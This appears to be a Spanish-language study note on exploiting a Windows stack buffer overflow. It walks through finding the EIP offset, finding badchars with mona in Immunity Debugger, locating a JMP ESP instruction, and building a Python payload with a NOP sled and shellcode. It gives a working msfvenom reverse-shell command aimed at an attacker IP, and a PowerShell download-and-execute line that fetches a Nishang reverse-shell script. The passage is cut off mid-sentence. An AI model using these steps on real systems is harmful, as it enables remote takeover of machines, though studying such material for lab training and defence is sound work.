---

---
------
- Tags: #linux #windows 
-----------
### ¿Qué es?

> Un ataque de desbordamiento del búfer se produce cuando un atacante manipula el error de codificación para llevar a cabo acciones maliciosas y comprometer el sistema afectado. El atacante altera la ruta de ejecución de la aplicación y sobrescribe elementos de su memoria, lo que modifica la ruta de ejecución del programa para dañar archivos existentes o exponer datos.

Un ataque de desbordamiento de búfer generalmente implica violaciones de los lenguajes de programación y sobrescribir los límites de los búferes en los que existen. La mayoría de los desbordamientos del búfer son causados por la combinación de manipulación de la memoria y suposiciones erróneas en torno a la composición o el tamaño de los datos.

Una vez que se encuentra el límite del campo de entrada, el siguiente paso es averiguar el **offset**, que corresponde al número exacto de caracteres que se deben introducir para provocar una corrupción en el programa y, por lo tanto, para sobrescribir el valor del registro EIP.
### Averiguando el offset

El registro **EIP** (**Extended Instruction Pointer**) es un registro de la CPU que apunta a la dirección de memoria donde se encuentra la siguiente instrucción que se va a ejecutar. En un buffer overflow exitoso, el valor del registro EIP se sobrescribe con **una dirección controlada por el atacante**, lo que permite ejecutar código malicioso en lugar del código original del programa.

Por lo tanto, el objetivo de averiguar el offset es determinar el número exacto de caracteres que se deben introducir en el campo de entrada para sobrescribir el valor del registro EIP y apuntar a la dirección de memoria controlada por el atacante. Una vez que se conoce el offset, el atacante puede diseñar un exploit personalizado para el programa objetivo que permita tomar control del registro EIP y ejecutar código malicioso.

Para averiguar el offset, necesitamos el valor del EIP (obtenido una vez el servicio ha sido corrompido) y, desde Linux, utilizar pattern_offset así:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x<EIP_VALUE>
```

Una vez obtenido el offset, podemos crear el payload para realizar el buffer overflow:
```python
before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip
```

Hemos puesto ese valor para `eip` para comprobar si todo ha ido bien. El ASCII del carácter 'B' es 42, por lo que si todo ha ido bien, en el Inmunity Debugger deberíamos ver lo siguiente:

![[Pasted image 20250313155652.png]]

Otra forma de averiguar el offset es usando gdb-peda, con la instrucción `pattern offset $eip` si previamente hemos realizado el Buffer Overflow con un pattern creado
### Averiguando los badchars

Están los conocidos "badchars" que debemos evitar a la hora de construir el payload correspondiente. Para obtenerlos podemos hacer uso de **mona** en el Inmunity Debugger e ir comparando con el valor del ESP (es necesario haber obtenido previamente el offset).

Una vez tenemos el payload, podemos sencillamente añadir al payload muchas 'C' (`payload = before_eip + eip + b"C"*500`) y comprobar el valor del ESP. Si vemos esto:

![[Pasted image 20250313160044.png]]

Es que vamos por buen camino. Click derecho sobre el valor -> Follow in Dump. Podremos ver el valor del EIP y muchas 'C' en el ESP. Ahora generaremos un bytearray con mona en el Inmunity Debugger:

```cmd
!mona bytearray -cpb '\x00'
```

El \x00 es porque es usualmente un badchar. Se habrá generado el bytearray correspondiente. Seteamos con SMB la carpeta en windows para la transferencia con el protocolo SMB y desde Linux, transferimos:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Abrimos un nuevo explorador de archivos con windows y ponemos la ruta `\\192.168.1.38\smbFolder`. Arrastramos el bytearray ahí (Si nos fijamos, gracias a `$(pwd)` nos encontramos en la ruta donde estamos trabajando en Linux) . Seleccionamos los badchars y los metemos en el script, modificando el payload para que en vez de 'C', se añadan los badchars

![[Pasted image 20250313163740.png]]

Ejecutamos nuevamente el script y ahora podremos ir viendo qué caracteres no le gusta, es decir, obtener los badchars. Follow in Dump el ESP y ahora:

![[Pasted image 20250313164111.png]]

Como vemos, no sigue la secuencia normal (0A, 0B, 0C, 0D), por lo que tiene pinta de que el 0D no le gusta. Lo comprobamos con mona:

```cmd
!mona compare -a 0x<VALOR_ESP> -f C:\Users\lunet\Desktop\Analysis\bytearray.bin
```

![[Pasted image 20250313164449.png]]

Quitamos desde el exploit el valor \x0d y generamos un nuevo bytearray añadiendo esta vez x00 y x0d: `!mona bytearray -cpb '\x00\x0d'` Lo ejecutamos de nuevo, y el proceso es igual, ir eliminando badchars hasta que veamos con Follow in Dump del valor del ESP que sigue la trayectoria desde 01 hasta FF (valores hexadecimales) que no se corta en ningún momento. Realizamos el compare de nuevo con mona con el nuevo bytearray creado y si vemos esto:

![[Pasted image 20250313165215.png]]

Ya estaría solucionado lo de los badchars. 
### Utilizando msfvenom para hacer un reverse shell mediante BOF

Una vez que se ha generado el shellcode malicioso y se han detectado los badchars, el siguiente paso es hacer que el flujo del programa entre en el shellcode para que sea interpretado. La idea es hacer que el registro EIP apunte a una dirección de memoria donde se aplique un **opcode** que realice un salto al registro **ESP** (**JMP ESP**), que es donde se encuentra el shellcode. Esto es así dado que de primeras no podemos hacer que el EIP apunte directamente a nuestro shellcode.

Podemos utilizar `msfvenom` para crear una reverse shell especificando el tipo de payload (en este caso, `-p windows/shell_reverse_tcp`), la plataforma (con el parámetro `--patform`), la arquitectura (`-a x86`), con LHOST nuestra IP de atacante, con LPORT el puerto de escucha, el encoder (`-e x86/shikata_ga_nai`). cabe destacar el uso de `EXITFUNC=thread` al final de la línea. Al realizar un buffer overflow, poniendo esto último evitamos que al salir del terminal se detenga el servicio. También podemos excluir con el parámetro `-b` los badchars previamente encontrados.

Generamos el shellcode con msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.38 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0d' EXITFUNC=thread
```

Y lo añadimos al exploit, sin olvidarnos de poner en cada línea el caracter b:

![[Pasted image 20250313170900.png]]

En ocasiones, el procesador no tiene suficiente tiempo para ejecutar la instrucción que queremos (en este caso, el payload) antes de pasar a la siguiente. Para solucionar esto, podemos agrear NOPs (Non Operation Process) justo antes del shellcode generado con msfvenom de la siguiente forma: `b"\x90"*16` (16 veces, pero pueden ser más). 

```python
payload = before_eip + eip + b"\x90"*16 + shellcode
```

También debemos modificar el valor del EIP para incluir en little-endian el JESP (Jump ESP), es decir, la instrucción que apunte al ESP "de un salto". Para ello tiramos de `nasm`:

![[Pasted image 20250313171227.png]]

Tendremos que listar los módulos de mona con `!mona modules` y buscar el que apunta al programa que queremos. Por ejemplo, minishare.exe:

![[Pasted image 20250313171434.png]]

Como hemos visto con nasm, el valor de salto al ESP es FFE4, es decir, \xFF\xE4. Buscamos con mona:

```cmd
!mona find -s "\xFF\xE4" -m <MODULO>
```

Si no encuentra punteros, otra forma es tirar con wildcards con la opción findwild de mona, diciéndole que busque JMP ESP así:

```cmd
!mona findwild -s "JMP ESP"
```

Nos dará una lista de instrucciones, cogemos una que no tenga los bachards previamente descubiertos. 

Otra opción es realizar desplazamiento de la pila con la instrucción en bytes 0x10. Para obtener el valor de la instrucción, podemos usar `nasm` (/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb) de la siguiente manera: `sub esp,0x10`. Lo que hacemos es decrementar el valor del puntero al EIP 16 veces, y así conseguimos hacer el desplazamiento. Gracias a `nasm` obtenemos el opcode del decremento del puntero. 

### Modificación del shellcode para controlar el comando a ejecutar

Ya hemos visto con msfvenom como generar el payload para hacer el buffer overflow con los parámetros correspondientes:

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.38 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread 
```

Pero podemos cargar directamente el comando a ejecutar cambiando `windows/shell_reverse_tcp` por `windows/exec CMD=""`. Evidentemente, si hacemos esto, no necesitamos poner ni el host ni el puerto. Podemos generar con powershell el comando. Por ejemplo:

```bash
(...) CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.X.XX/PS.ps1')"
```

Desde la powershell (diferente al CMD) vamos a interpretar un recurso que tenemos hosteado en la IP. El recurso en cuestión es de [Nishang](https://github.com/samratashok/nishang). En este caso, podemos usar el recurso `Invoke-PowerShellTcp.ps1`, que es un script en powershell 